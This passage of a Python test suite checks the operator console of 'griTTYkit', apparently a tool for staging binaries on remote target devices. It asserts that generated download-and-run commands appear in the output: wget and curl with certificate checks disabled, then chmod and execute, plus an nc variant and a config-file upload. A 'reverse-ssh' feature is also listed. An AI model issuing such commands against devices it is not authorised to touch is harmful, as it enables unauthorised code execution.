            print(json.dumps(dumb_line_doc, indent=2), file=sys.stderr)
            return 1
        if dumb_line_doc.get("services", {}).get("workbench", {}).get("workbench_mode") != "line":
            print("TERM=dumb line-oriented console fallback did not preserve line workbench mode", file=sys.stderr)
            print(json.dumps(dumb_line_doc, indent=2), file=sys.stderr)
            return 1
        dumb_invalid_state = Path(tmp) / "operator-session" / "line-dumb-invalid-state.json"
        dumb_invalid_staged = Path(tmp) / "operator-session" / "line-dumb-invalid-staged.json"
        dumb_invalid_master, dumb_invalid_slave = pty.openpty()
        try:
            dumb_invalid_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(upload_cfg),
                    "--state-file", str(dumb_invalid_state),
                    "--staged-file", str(dumb_invalid_staged),
                ],
                cwd=ROOT,
                stdin=dumb_invalid_slave,
                stdout=dumb_invalid_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(dumb_invalid_slave)
            dumb_invalid_slave = -1
            time.sleep(0.3)
            os.write(dumb_invalid_master, b"6\n/no/such/file\n/tmp/missing\n8\n../bad\nq\n")
            deadline = time.time() + 5
            while dumb_invalid_proc.poll() is None and time.time() < deadline:
                ready, _, _ = select.select([dumb_invalid_master], [], [], 0.1)
                if ready:
                    try:
                        os.read(dumb_invalid_master, 65536)
                    except OSError:
                        break
            if dumb_invalid_proc.poll() is None:
                dumb_invalid_proc.kill()
            _dumb_invalid_stdout, dumb_invalid_stderr = dumb_invalid_proc.communicate(timeout=5)
        finally:
            if dumb_invalid_slave != -1:
                os.close(dumb_invalid_slave)
            try:
                os.close(dumb_invalid_master)
            except OSError:
                pass
        if dumb_invalid_proc.returncode != 0 or "Traceback" in (dumb_invalid_stderr or ""):
            print("TERM=dumb line-oriented console fallback did not handle invalid stage/unstage input cleanly", file=sys.stderr)
            print(dumb_invalid_stderr or "", file=sys.stderr)
            return 1
        dumb_invalid_doc = json.loads(dumb_invalid_state.read_text(encoding="utf-8"))
        if dumb_invalid_doc.get("services", {}).get("workbench", {}).get("status") != "stopped":
            print("TERM=dumb invalid-input fallback did not mark workbench stopped", file=sys.stderr)
            print(json.dumps(dumb_invalid_doc, indent=2), file=sys.stderr)
            return 1
        if dumb_invalid_doc.get("services", {}).get("workbench", {}).get("workbench_mode") != "line":
            print("TERM=dumb invalid-input fallback did not preserve line workbench mode", file=sys.stderr)
            print(json.dumps(dumb_invalid_doc, indent=2), file=sys.stderr)
            return 1

        line_stage_source = Path(tmp) / "line-stage-source.bin"
        line_stage_source.write_text("line staged bytes\n", encoding="utf-8")
        line_binary_source = Path(tmp) / "grit-line-binary"
        line_binary_source.write_text("#!/bin/sh\necho grit line binary\n", encoding="utf-8")
        line_stage_state = Path(tmp) / "operator-session" / "line-stage-state.json"
        line_stage_staged = Path(tmp) / "operator-session" / "line-stage-staged.json"
        line_stage_master, line_stage_slave = pty.openpty()
        try:
            line_stage_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(upload_cfg),
                    "--state-file", str(line_stage_state),
                    "--staged-file", str(line_stage_staged),
                ],
                cwd=ROOT,
                stdin=line_stage_slave,
                stdout=line_stage_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(line_stage_slave)
            line_stage_slave = -1
            time.sleep(0.3)
            os.write(line_stage_master, f"6\n{line_stage_source}\n/tmp/line-stage\n22\n{line_binary_source}\ngrit\nn\n7\n8\n/tmp/line-stage\n8\ngrit\nq\n".encode("utf-8"))
            line_stage_chunks = []
            deadline = time.time() + 5
            while line_stage_proc.poll() is None and time.time() < deadline:
                ready, _, _ = select.select([line_stage_master], [], [], 0.1)
                if ready:
                    try:
                        line_stage_chunks.append(os.read(line_stage_master, 65536).decode("utf-8", errors="replace"))
                    except OSError:
                        break
            if line_stage_proc.poll() is None:
                line_stage_proc.terminate()
                try:
                    line_stage_proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    line_stage_proc.kill()
                    line_stage_proc.wait(timeout=2)
            line_stage_stdout = "".join(line_stage_chunks)
            line_stage_stderr = line_stage_proc.stderr.read()
        finally:
            if line_stage_slave != -1:
                os.close(line_stage_slave)
            try:
                os.close(line_stage_master)
            except OSError:
                pass
        if (line_stage_proc.returncode != 0 or
                "Traceback" in (line_stage_stderr or "") or
                "headless_command:" in line_stage_stdout or
                "griTTYkit binary staged for target fetch:" not in line_stage_stdout or
                "name: grit" not in line_stage_stdout or
                "target fetch: grit fetch grit" not in line_stage_stdout or
                "run hint: chmod +x ./grit && ./grit --help" not in line_stage_stdout or
                "Target fetch options:" not in line_stage_stdout or
                "wget --no-check-certificate -O ./grit " not in line_stage_stdout or
                "curl -fLk -o ./grit " not in line_stage_stdout or
                "nc:    requires file-service TLS=no" not in line_stage_stdout or
                "/fetch?name=grit" not in line_stage_stdout or
                "File service workflow actions:" not in line_stage_stdout or
                "file-service:list-staged-files state=ready reason=run-now enter=yes" not in line_stage_stdout or
                "file-service:stage-file state=needs-input reason=input-required" not in line_stage_stdout or
                "file-service:show-upload-command state=needs-input reason=input-required" not in line_stage_stdout or
                "Staged file workflow actions:" not in line_stage_stdout or
                "/tmp/line-stage:show-fetch-command" not in line_stage_stdout or
                "/tmp/line-stage:queue-staged-fetch state=needs-target reason=target-required" not in line_stage_stdout):
            print("line-oriented console stage/unstage exposed noisy headless commands or missed expected summaries", file=sys.stderr)
            print(line_stage_stdout, file=sys.stderr)
            print(line_stage_stderr or "", file=sys.stderr)
            return 1
        line_stage_doc = json.loads(line_stage_state.read_text(encoding="utf-8"))
        line_stage_status = subprocess.run(
            [
                str(server),
                "--config", str(upload_cfg),
                "--state-file", str(line_stage_state),
                "--staged-file", str(line_stage_staged),
                "--json-status",
            ],
            cwd=ROOT,
            text=True,
            capture_output=True,
        )
        if line_stage_status.returncode != 0:
            print("line-oriented console stage status failed", file=sys.stderr)
            print(line_stage_status.stdout, file=sys.stderr)
            print(line_stage_status.stderr, file=sys.stderr)
            return 1
        line_stage_status_doc = json.loads(line_stage_status.stdout)
        line_file_actions = line_stage_status_doc.get("file_service_workflow_actions") or []
        line_file_actions_by_id = line_stage_status_doc.get("file_service_workflow_actions_by_id") or {}
        if (len(line_file_actions) != 6 or
                line_file_actions_by_id.get("file-service:list-staged-files", {}).get("can_run_from_curses_enter") is not True or
                line_file_actions_by_id.get("file-service:stage-file", {}).get("requires_input") is not True or
                line_file_actions_by_id.get("file-service:show-upload-command", {}).get("target_command_template", "").find("put TARGET_PATH") == -1 or
                line_stage_status_doc.get("summary", {}).get("file_service_workflow_action_count") != 6 or
                line_stage_status_doc.get("summary", {}).get("file_service_workflow_action_requires_input_count") != 2 or
                "file_service_workflow_actions_by_operator_action_state" not in ((line_stage_status_doc.get("api_collections") or {}).get("file_service_workflow_actions") or {}).get("indexes", [])):
            print("line-oriented console file-service workflow actions missing status/API contract", file=sys.stderr)
            print(json.dumps(line_stage_status_doc, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        line_stage_events = [
            json.loads(line)
            for line in Path(line_stage_status_doc.get("event_log", "")).read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]
        file_stage_events = [
            event for event in line_stage_events
            if event.get("event") == "workbench_file_staged"
        ]
        file_view_events = [
            event for event in line_stage_events
            if event.get("event") == "workbench_staged_files_viewed"
        ]
        file_unstage_events = [
            event for event in line_stage_events
            if event.get("event") == "workbench_file_unstaged"
        ]
        binary_events = [
            event for event in line_stage_events
            if event.get("event") == "workbench_binary_served"
        ]
        if (not any(
                    (event.get("details") or {}).get("request_name") == "/tmp/line-stage" and
                    "--serve-file " in ((event.get("details") or {}).get("headless_command") or "")
                    for event in file_stage_events) or
                not any(
                    (event.get("details") or {}).get("request_name") == "grit" and
                    (event.get("details") or {}).get("stage_kind") == "operator-binary" and
                    (event.get("details") or {}).get("started_file_service") is False and
                    "grit fetch grit" in ((event.get("details") or {}).get("fetch_command") or "") and
                    "./grit --help" in ((event.get("details") or {}).get("target_run_hint") or "")
                    for event in binary_events) or
                not any(
                    (event.get("details") or {}).get("staged_count", 0) >= 1 and
                    (event.get("details") or {}).get("file_service_workflow_action_count", 0) == 6 and
                    (event.get("details") or {}).get("staged_file_workflow_action_count", 0) >= 4 and
                    "--list-staged" in ((event.get("details") or {}).get("headless_command") or "")
                    for event in file_view_events) or
                not any(
                    (event.get("details") or {}).get("request_name") == "/tmp/line-stage" and
                    "--unstage /tmp/line-stage --list-staged" in ((event.get("details") or {}).get("headless_command") or "")
                    for event in file_unstage_events)):
            print("line-oriented console stage/unstage did not record workbench events", file=sys.stderr)
            print(json.dumps(line_stage_status_doc, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        if (line_stage_doc.get("services", {}).get("workbench", {}).get("status") != "stopped" or
                (json.loads(line_stage_staged.read_text(encoding="utf-8")).get("staged") or {}).get("/tmp/line-stage")):
            print("line-oriented console stage/unstage final state was incorrect", file=sys.stderr)
            print(json.dumps(line_stage_doc, indent=2), file=sys.stderr)
            print(line_stage_staged.read_text(encoding="utf-8"), file=sys.stderr)
            return 1

        rc = run_line_console_smoke(server, tmp, upload_cfg, session_root)
        if rc:
            return rc

        file_workflow_dir = Path(tmp) / "operator-session-file-workflow-actions"
        file_workflow_cfg = Path(tmp) / "file-workflow-actions.json"
        file_workflow_source = Path(tmp) / "workflow-source.txt"
        file_workflow_source.write_text("workflow staged payload\n", encoding="utf-8")
        file_workflow_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "operator_session_dir": str(file_workflow_dir),
            "server_state": str(file_workflow_dir / "state.json"),
            "staged_files": str(file_workflow_dir / "staged-files.json"),
            "command_queue_file": str(file_workflow_dir / "command-queue.json"),
            "targets_file": str(file_workflow_dir / "targets.json"),
            "GRIT_OPERATOR_FILE_SERVICE_PORT": free_port(),
        }), encoding="utf-8")
        file_action_stage = run(
            "scripts/grit-console",
            "--config", str(file_workflow_cfg),
            "--target-id", "file-workflow-target",
            "--target-label", "File Workflow Target",
            "--run-file-service-workflow-action", "file-service:stage-file",
            "--file-service-workflow-local-file", str(file_workflow_source),
            "--file-service-workflow-request-name", "workflow-staged.txt",
        )
        if (file_action_stage.returncode != 0 or
                "file service workflow action: file-service:stage-file" not in file_action_stage.stdout or
                "staged workflow-staged.txt <- " not in file_action_stage.stdout or
                "target=file-workflow-target label=File Workflow Target" not in file_action_stage.stdout):
            print("headless file-service workflow stage action failed", file=sys.stderr)
            print(file_action_stage.stdout, file=sys.stderr)
            print(file_action_stage.stderr, file=sys.stderr)
            return 1
        file_action_upload = run(
            "scripts/grit-console",
            "--config", str(file_workflow_cfg),
            "--target-id", "file-workflow-target",
            "--target-label", "File Workflow Target",
            "--run-file-service-workflow-action", "file-service:show-upload-command",
            "--file-service-workflow-target-path", "/etc/config/network",
        )
        if (file_action_upload.returncode != 0 or
                "file service workflow action: file-service:show-upload-command" not in file_action_upload.stdout or
                "target_upload_path=/etc/config/network" not in file_action_upload.stdout or
                "./grit put /etc/config/network" not in file_action_upload.stdout):
            print("headless file-service workflow upload command action failed", file=sys.stderr)
            print(file_action_upload.stdout, file=sys.stderr)
            print(file_action_upload.stderr, file=sys.stderr)
            return 1
        staged_action_show = run(
            "scripts/grit-console",
            "--config", str(file_workflow_cfg),
            "--run-staged-file-workflow-action", "workflow-staged.txt:show-fetch-command",
        )
        if (staged_action_show.returncode != 0 or
                "staged file workflow action: workflow-staged.txt:show-fetch-command" not in staged_action_show.stdout or
                "target_command=" not in staged_action_show.stdout or
                "grit fetch workflow-staged.txt" not in staged_action_show.stdout):
            print("headless staged-file workflow show-fetch action failed", file=sys.stderr)
            print(staged_action_show.stdout, file=sys.stderr)
            print(staged_action_show.stderr, file=sys.stderr)
            return 1
        staged_action_queue = run(
            "scripts/grit-console",
            "--config", str(file_workflow_cfg),
            "--run-staged-file-workflow-action", "workflow-staged.txt:queue-staged-fetch",
        )
        if (staged_action_queue.returncode != 0 or
                "staged file workflow action: workflow-staged.txt:queue-staged-fetch" not in staged_action_queue.stdout or
                "queued " not in staged_action_queue.stdout or
                "grit fetch workflow-staged.txt" not in staged_action_queue.stdout or
                "target=file-workflow-target label=File Workflow Target" not in staged_action_queue.stdout):
            print("headless staged-file workflow queue action failed", file=sys.stderr)
            print(staged_action_queue.stdout, file=sys.stderr)
            print(staged_action_queue.stderr, file=sys.stderr)
            return 1
        staged_action_unstage = run(
            "scripts/grit-console",
            "--config", str(file_workflow_cfg),
            "--run-staged-file-workflow-action", "workflow-staged.txt:unstage",
            "--confirm-staged-file-workflow-action",
        )
        if (staged_action_unstage.returncode != 0 or
                "staged file workflow action: workflow-staged.txt:unstage" not in staged_action_unstage.stdout or
                "unstaged workflow-staged.txt" not in staged_action_unstage.stdout):
            print("headless staged-file workflow unstage action failed", file=sys.stderr)
            print(staged_action_unstage.stdout, file=sys.stderr)
            print(staged_action_unstage.stderr, file=sys.stderr)
            return 1
        file_workflow_doc = json.loads(run(
            "scripts/grit-console",
            "--config", str(file_workflow_cfg),
            "--event-limit", "24",
            "--json-status",
        ).stdout)
        file_workflow_events = file_workflow_doc.get("events_by_event") or {}
        file_workflow_queue = (file_workflow_doc.get("command_queue") or {}).get("commands_by_target_id", {}).get("file-workflow-target") or []
        if (len(file_workflow_queue) != 1 or
                "grit fetch workflow-staged.txt" not in str(file_workflow_queue[0].get("command") or "") or
                (file_workflow_doc.get("staged") or {}) or
                not file_workflow_events.get("file_service_workflow_action_selected") or
                not file_workflow_events.get("file_service_workflow_action_completed") or
                not file_workflow_events.get("staged_file_workflow_action_selected") or
                not any(
                    (event.get("details") or {}).get("request_name") == "workflow-staged.txt" and
                    (event.get("details") or {}).get("action_id") == "queue-staged-fetch" and
                    (event.get("details") or {}).get("queues_offline_work") is True and
                    (event.get("details") or {}).get("fleet_target_count") == 0 and
                    (event.get("details") or {}).get("fleet_mailbox_pending_work_count") == 0
                    for event in file_workflow_events.get("staged_file_workflow_action_completed", [])
                )):
            print("headless file/staged workflow actions did not persist expected events and mailbox state", file=sys.stderr)
            print(json.dumps(file_workflow_doc, indent=2, sort_keys=True), file=sys.stderr)
            return 1

        staged_source = Path(tmp) / "operator-file.bin"
        staged_source.write_bytes(b"operator staged bytes\n")
        fetch_port = free_port()
        advertised_operator_host = "192.0.2.44"
        fetch_cfg = Path(tmp) / "server-config-fetch.json"
        fetch_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_SERVER_HOST": advertised_operator_host,
            "GRIT_OPERATOR_FILE_SERVICE_PORT": fetch_port,
            "session_root": str(Path(tmp) / "sessions-fetch"),
            "operator_session_dir": str(Path(tmp) / "operator-session-fetch"),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
            "GRIT_OPERATOR_FILE_SERVICE_TLS": "no",
        }), encoding="utf-8")

        tui = run(
            "scripts/grit-console",
            "--config", str(fetch_cfg),
            "--state-file", str(state_file),
            "--staged-file", str(staged_file),
        )
        if tui.returncode != 0 or "griTTYkit Operator Workbench" not in tui.stdout:
            print("noninteractive console/workbench failed:", file=sys.stderr)
            print(tui.stdout, file=sys.stderr)
            print(tui.stderr, file=sys.stderr)
            return 1
        if ("Operator paths:" not in tui.stdout or
                str(state_file) not in tui.stdout or
                str(staged_file) not in tui.stdout or
                "Operator state:" not in tui.stdout or
                "command_queue: status=missing kind=json-state" not in tui.stdout or
                "session_root: status=missing kind=directory" not in tui.stdout or
                "Workbench mode: noninteractive" not in tui.stdout or
                "Workbench refresh: count=" not in tui.stdout or
                "API resources: schema=1 resources=" not in tui.stdout or
                "collections_key=api_collections resources_key=api_resources" not in tui.stdout or
                "active_control_channel=no" not in tui.stdout or
                "arbitrary_execution_allowed=no" not in tui.stdout or
                "policy_flags: operator_queue_records_only=yes metadata_only_default=yes safe_disabled_default=yes" not in tui.stdout or
                "transport_support: poll=no live_polling=no" not in tui.stdout or
                "execution_supported=no delivery_supported=no result_upload_supported=yes" not in tui.stdout or
                "session_root:" not in tui.stdout or
                "Operator workflow actions:" not in tui.stdout or
                "make package" not in tui.stdout or
                "scripts/grit-bringup --recommend-only --json --operator-config" not in tui.stdout or
                "--stage-recommended-artifact" not in tui.stdout):
            print("noninteractive console/workbench missing operator path details", file=sys.stderr)
            print(tui.stdout, file=sys.stderr)
            return 1
        tui_status = run(
            "scripts/grit-console",
            "--config", str(fetch_cfg),
            "--state-file", str(state_file),
            "--staged-file", str(staged_file),
            "--json-status",
        )
        tui_doc = json.loads(tui_status.stdout)
        tui_operator_counts = tui_doc.get("summary", {})
        if (tui_operator_counts.get("operator_state_unhealthy_count") != (
                tui_operator_counts.get("operator_state_missing_count", 0) +
                tui_operator_counts.get("operator_state_invalid_count", 0) +
                tui_operator_counts.get("operator_state_error_count", 0)) or
                tui_operator_counts.get("operator_state_count") != len(tui_doc.get("operator_state_records") or [])):
            print("noninteractive console/workbench missing operator state summary counters", file=sys.stderr)
            print(tui_status.stdout, file=sys.stderr)
            return 1

        release_dir = Path(tmp) / "release"
        (release_dir / "bin").mkdir(parents=True)
        (release_dir / "scripts").mkdir()
        (release_dir / "manifests").mkdir()
        (release_dir / "LICENSES").mkdir()
        (release_dir / "docs").mkdir()
        (release_dir / "bin" / "grit-test").write_text("artifact\n", encoding="utf-8")
        (release_dir / "LICENSE.grit").write_text("griTTYkit license grant\n", encoding="utf-8")
        (release_dir / "LICENSE").write_text("GNU GENERAL PUBLIC LICENSE Version 2, June 1991\n", encoding="utf-8")
        (release_dir / "NOTICE").write_text("griTTYkit project license notice\n", encoding="utf-8")
        (release_dir / "LICENSES" / "busybox.txt").write_text("BusyBox notice\n", encoding="utf-8")
        (release_dir / "LICENSES" / "buildroot.txt").write_text("Buildroot notice\n", encoding="utf-8")
        (release_dir / "LICENSES" / "doom-ascii.txt").write_text("doom-ascii notice\n", encoding="utf-8")
        (release_dir / "LICENSES" / "miniz.txt").write_text("miniz notice\n", encoding="utf-8")
        (release_dir / "docs" / "licensing.md").write_text("griTTYkit licensing guide\n", encoding="utf-8")
        (release_dir / "sources.lock.json").write_text('{"schema":2,"sources":[]}\n', encoding="utf-8")
        (release_dir / "manifests" / "sources.lock.json").write_text('{"schema":2,"sources":[]}\n', encoding="utf-8")
        (release_dir / "manifests" / "license-policy.json").write_text(json.dumps({
            "schema": 1,
            "project": {"name": "griTTYkit", "license": "GPL-2.0-or-later"},
            "compatibility": {
                "combined_gplv2_compatible": True,
                "preferred_combined_terms_with_busybox": "GPL-2.0",
                "source_availability_required_for_distribution": True,
            },
            "license_evidence": {
                "verified_at": "2026-05-29",
                "sources": [
                    {"name": "BusyBox", "url": "https://busybox.net/license.html", "license": "GPL-2.0", "note": "official BusyBox license page"},
                    {"name": "Buildroot", "url": "https://buildroot.org/downloads/manual/manual.html", "license": "GPL-2.0-or-later with package exceptions", "note": "official Buildroot manual"},
                ],
            },
            "artifact_distribution": {
                "corresponding_source_strategy": {
                    "status": "required_for_distribution",
                    "summary": "Redistributed binaries should include corresponding source for griTTYkit and BusyBox.",
                    "release_bundle_inputs": ["LICENSE", "LICENSE.grit", "NOTICE", "LICENSES/", "manifests/license-policy.json", "manifests/sources.lock.json", "sources.lock.json"],
                    "source_reconstruction_inputs": ["this repository at the recorded release commit", "pinned downloadable sources in manifests/sources.lock.json", "Buildroot-generated package source manifests", "vendored third-party notices under third_party/"],
                    "requires_package_license_audit": True,
                },
            },
            "components": [
                {"name": "griTTYkit", "license": "GPL-2.0-or-later"},
                {"name": "BusyBox", "license": "GPL-2.0"},
                {"name": "Buildroot", "license": "GPL-2.0-or-later with package exceptions"},
                {"name": "doom-ascii", "license": "GPL-2.0-or-later"},
                {"name": "miniz", "license": "MIT OR Unlicense"},
            ],
        }) + "\n", encoding="utf-8")
        (release_dir / "release.json").write_text(json.dumps({
            "schema": 1,
            "release_name": "operator-smoke",
            "layout": {
                "devices": {
                    "lab-router": {
                        "tuple_path": "by-tuple/native/host/host/host",
                        "artifacts": ["by-tuple/native/host/host/host/bin/grit-test"],
                    }
                },
                "tuples": {
                    "by-tuple/native/host/host/host": {
                        "tuple": {"arch": "native", "libc": "host", "kernel_floor": "host"},
                        "artifacts": ["by-tuple/native/host/host/host/bin/grit-test"],
                    }
                },
            },
        }) + "\n", encoding="utf-8")
        (release_dir / "release-index.json").write_text(json.dumps({
            "schema": 1,
            "release_name": "operator-smoke",
            "devices": {
                "lab-router": {
                    "tuple_path": "by-tuple/native/host/host/host",
                    "artifacts": ["by-tuple/native/host/host/host/bin/grit-test"],
                }
            },
            "tuples": {
                "by-tuple/native/host/host/host": {
                    "tuple": {"arch": "native", "libc": "host", "kernel_floor": "host"},
                    "artifacts": ["by-tuple/native/host/host/host/bin/grit-test"],
                }
            },
            "artifacts": [
                {
                    "artifact": "bin/grit-test",
                    "tuple_artifact": "bin/grit-test",
                    "tuple_path": "by-tuple/native/host/host/host",
                    "payload_preset": "default",
                    "sha256": "abc123",
                    "tools": ["sh"],
                    "features": ["reverse-ssh", "default", "sh", "reverse-ssh"],
                    "tool_provider_status": {"gdbserver": {"schema": 1, "overall": "found", "search_paths": []}},
                    "doom_wads": [
                        {
                            "filename": "doom.wad",
                            "size": 9,
                            "sha256": "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
                        }
                    ],
                    "command_queue": {
                        "enabled": "no",
                        "execution_supported": False,
                        "executes_commands": False,
                        "mode_summary": {"operator_supplied_command_execution_mode_count": 0},
                    },
                    "compatibility": {"label": "exact", "reasons": ["fixture"]},
                }
            ],
        }) + "\n", encoding="utf-8")
        release_set_cfg = Path(tmp) / "release-set-config.json"
        release_set_state = Path(tmp) / "release-set-state.json"
        release_set_staged = Path(tmp) / "release-set-staged.json"
        release_set_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "operator_session_dir": str(Path(tmp) / "release-set-operator-session"),
            "server_state": str(release_set_state),
            "staged_files": str(release_set_staged),
        }), encoding="utf-8")
        release_set_master, release_set_slave = pty.openpty()
        try:
            release_set_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(release_set_cfg),
                    "--state-file", str(release_set_state),
                    "--staged-file", str(release_set_staged),
                ],
                cwd=tmp,
                stdin=release_set_slave,
                stdout=release_set_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(release_set_slave)
            release_set_slave = -1
            time.sleep(0.3)
            os.write(release_set_master, f"release\nset release_dir {release_dir}\nrelease\nq\nq\n".encode("utf-8"))
            release_set_chunks = []
            deadline = time.time() + 8
            while release_set_proc.poll() is None and time.time() < deadline:
                ready, _, _ = select.select([release_set_master], [], [], 0.1)
                if ready:
                    try:
                        release_set_chunks.append(os.read(release_set_master, 65536).decode("utf-8", errors="replace"))
                    except OSError:
                        break
            if release_set_proc.poll() is None:
                release_set_proc.terminate()
                try:
                    release_set_proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    release_set_proc.kill()
                    release_set_proc.wait(timeout=2)
            release_set_stdout = "".join(release_set_chunks)
            release_set_stderr = release_set_proc.stderr.read()
        finally:
            if release_set_slave != -1:
                os.close(release_set_slave)
            try:
                os.close(release_set_master)
            except OSError:
                pass
        release_set_saved = json.loads(release_set_cfg.read_text(encoding="utf-8"))
        if (release_set_proc.returncode != 0 or
                "Traceback" in (release_set_stderr or "") or
                "set release_dir=" not in release_set_stdout or
                "Release  operator-smoke" not in release_set_stdout or
                str(release_set_saved.get("release_dir") or "") != str(release_dir)):
            print("line console could not set release_dir without restarting", file=sys.stderr)
            print(release_set_stdout, file=sys.stderr)
            print(release_set_stderr or "", file=sys.stderr)
            return 1

        release_view = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(state_file),
                "--staged-file", str(staged_file),
            ],
            cwd=release_dir,
            text=True,
            capture_output=True,
        )
        if ("Release artifact browser" not in release_view.stdout or
                "Release summary:" not in release_view.stdout or
                "present=yes valid=yes release_json_valid=yes release_index_valid=yes" not in release_view.stdout or
                "detection_source=auto detection_reason=release.json,release-index.json,bin+scripts explicit_release_dir=no markers=3" not in release_view.stdout or
                "artifacts=1 devices=1 tuples=1 total_size=9" not in release_view.stdout or
                f"release_dir: {release_dir}" not in release_view.stdout or
                "release_name: operator-smoke" not in release_view.stdout or
                "license: project=GPL-2.0-or-later gplv2_compatible=yes valid=yes notices=11 missing_notices=0" not in release_view.stdout or
                "corresponding_source: required=yes status=required_for_distribution release_inputs=7 reconstruction_inputs=4 package_license_audit=yes" not in release_view.stdout or
                "license_evidence: verified_at=2026-05-29 sources=2" not in release_view.stdout or
                "grit-test" not in release_view.stdout or
                "compatibility=exact" not in release_view.stdout or
                "compatibility_reason: fixture" not in release_view.stdout or
                "provider_status_gdbserver: found" not in release_view.stdout or
                "doom_wad: doom.wad size=9" not in release_view.stdout or
                "Release recommendations" not in release_view.stdout or
                "by_device:lab-router -> bin/grit-test" not in release_view.stdout or
                "Release devices" not in release_view.stdout or
                "lab-router" not in release_view.stdout or
                "artifacts=1" not in release_view.stdout or
                "artifact_path:" not in release_view.stdout or
                "--stage-release-artifact" not in release_view.stdout):
            print("workbench did not show release artifact paths", file=sys.stderr)
            print(release_view.stdout, file=sys.stderr)
            return 1
        release_text_status = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(state_file),
                "--staged-file", str(staged_file),
                "--status",
            ],
            cwd=release_dir,
            text=True,
            capture_output=True,
        )
        if ("Release browser" not in release_text_status.stdout or
                "Release summary:" not in release_text_status.stdout or
                "present=yes valid=yes release_json_valid=yes release_index_valid=yes" not in release_text_status.stdout or
                "detection_source=auto detection_reason=release.json,release-index.json,bin+scripts explicit_release_dir=no markers=3" not in release_text_status.stdout or
                "artifacts=1 devices=1 tuples=1 total_size=9" not in release_text_status.stdout or
                "corresponding_source: required=yes status=required_for_distribution release_inputs=7 reconstruction_inputs=4 package_license_audit=yes" not in release_text_status.stdout or
                "license_evidence: verified_at=2026-05-29 sources=2" not in release_text_status.stdout or
                "recommendations:" not in release_text_status.stdout or
                "by_device:lab-router -> bin/grit-test" not in release_text_status.stdout):
            print("text --status missing release summary", file=sys.stderr)
            print(release_text_status.stdout, file=sys.stderr)
            return 1
        release_status = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(state_file),
                "--staged-file", str(staged_file),
                "--json-status",
            ],
            cwd=release_dir,
            text=True,
            capture_output=True,
        )
        release_doc = json.loads(release_status.stdout)
        rel = release_doc.get("release") or {}
        if (rel.get("release_name") != "operator-smoke" or
                not rel.get("artifacts") or
                rel.get("devices", [{}])[0].get("name") != "lab-router" or
                rel.get("devices", [{}])[0].get("artifact_count") != 1 or
                not rel.get("devices", [{}])[0].get("artifact_paths", [""])[0].endswith("bin/grit-test") or
                rel.get("tuples", [{}])[0].get("path") != "by-tuple/native/host/host/host"):
            print("json status missing release browser metadata", file=sys.stderr)
            print(release_status.stdout, file=sys.stderr)
            return 1
        if (rel.get("tuples", [{}])[0].get("artifact_count") != 1 or
                not rel.get("tuples", [{}])[0].get("artifact_paths", [""])[0].endswith("bin/grit-test")):
            print("json status missing release tuple artifact metadata", file=sys.stderr)
            print(release_status.stdout, file=sys.stderr)
            return 1
        release_artifact_map = rel.get("artifacts_by_release_path") or {}
        release_artifacts_by_name = rel.get("artifacts_by_name") or {}
        release_artifacts_by_sha = rel.get("artifacts_by_sha256") or {}
        release_artifacts_by_preset = rel.get("artifacts_by_payload_preset") or {}
        release_artifacts_by_compat = rel.get("artifacts_by_compatibility") or {}
        release_artifacts_by_source = rel.get("artifacts_by_source") or {}
        release_artifacts_by_tuple_path = rel.get("artifacts_by_tuple_path") or {}
        release_artifacts_by_tool = rel.get("artifacts_by_tool") or {}
        release_artifacts_by_device_alias = rel.get("artifacts_by_device_alias") or {}
        release_artifacts_by_feature = rel.get("artifacts_by_feature") or {}
        release_artifacts_by_tool_preset = rel.get("artifacts_by_tool_payload_preset") or {}
        release_artifacts_by_device_preset = rel.get("artifacts_by_device_payload_preset") or {}
        release_artifacts_by_feature_preset = rel.get("artifacts_by_feature_payload_preset") or {}
        release_artifacts_by_tuple_preset = rel.get("artifacts_by_tuple_payload_preset") or {}
        release_artifacts_by_provider_tool = rel.get("artifacts_by_provider_tool") or {}
        release_artifacts_by_provider_status = rel.get("artifacts_by_provider_status") or {}
        release_artifacts_by_doom_wad_filename = rel.get("artifacts_by_doom_wad_filename") or {}
        release_artifacts_by_doom_wad_sha256 = rel.get("artifacts_by_doom_wad_sha256") or {}
        release_artifacts_by_command_queue_enabled = rel.get("artifacts_by_command_queue_enabled") or {}
        release_artifacts_by_command_queue_execution_supported = rel.get("artifacts_by_command_queue_execution_supported") or {}
        release_artifacts_by_command_queue_operator_supplied = rel.get("artifacts_by_command_queue_operator_supplied_command_execution") or {}
        release_device_map = rel.get("devices_by_name") or {}
        release_devices_by_tuple_path = rel.get("devices_by_tuple_path") or {}
        release_devices_by_artifact = rel.get("devices_by_artifact") or {}
        release_tuple_map = rel.get("tuples_by_path") or {}
        release_tuples_by_artifact = rel.get("tuples_by_artifact") or {}
        release_recommendations = rel.get("recommendations") or {}
        release_recommendation_records = rel.get("recommendation_records") or []
        release_recommendations_by_scope = rel.get("recommendations_by_scope") or {}
        release_recommendations_by_artifact = rel.get("recommendations_by_artifact") or {}
        release_recommendations_by_payload = rel.get("recommendations_by_payload_preset") or {}
        release_recommendations_by_compat = rel.get("recommendations_by_compatibility") or {}
        release_artifact_actions = release_doc.get("release_artifact_workflow_actions") or []
        release_artifact_actions_by_selector = release_doc.get("release_artifact_workflow_actions_by_selector_kind") or {}
        release_artifact_actions_by_action = release_doc.get("release_artifact_workflow_actions_by_action_id") or {}
